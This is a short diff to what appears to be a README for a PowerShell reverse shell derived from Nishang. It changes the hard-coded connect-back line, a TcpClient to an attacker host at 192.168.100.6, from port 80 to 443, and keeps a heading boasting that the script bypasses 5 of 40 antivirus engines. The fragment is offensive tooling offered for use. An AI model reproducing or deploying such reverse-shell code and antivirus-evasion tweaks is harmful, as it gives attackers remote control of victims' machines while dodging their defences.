@@ -12,7 +12,7 @@ This script is based on Nishang's, thanks for sharing<br>
 
 ## If you want to modify the connection automatically with no arguments just modify line 1 as follows.
 
-$servidor = new-object System.Net.Sockets.TcpClient('192.168.100.6',80);  <br>
+$servidor = new-object System.Net.Sockets.TcpClient('192.168.100.6',443);  <br>
 
 ## Bypass 05/40 AV 
 
